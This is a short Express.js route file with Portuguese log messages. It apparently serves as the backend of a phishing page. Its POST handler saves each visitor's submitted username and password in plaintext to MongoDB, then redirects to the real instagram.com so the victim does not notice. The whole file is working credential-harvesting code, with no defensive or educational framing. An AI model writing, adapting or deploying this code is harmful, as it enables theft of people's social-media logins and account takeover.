const express = require("express");
const router = express.Router();
const mongoose = require("mongoose");
require("../models/Formulario");
const Users = mongoose.model("users");

router.get("/login", (req, res) => {
  res.render("index");
});
 
router.post("/home", (req, res) => {
  const newUser = new Users({
    usuario: req.body.user,
    password: req.body.password,
  });
  newUser
    .save()
    .then(() => {
      console.log("Sucesso!");
      res.redirect("https://www.instagram.com");
    })
    .catch((err) => {
      console.log("Erro: ", err);
    });
    
});
module.exports = router;
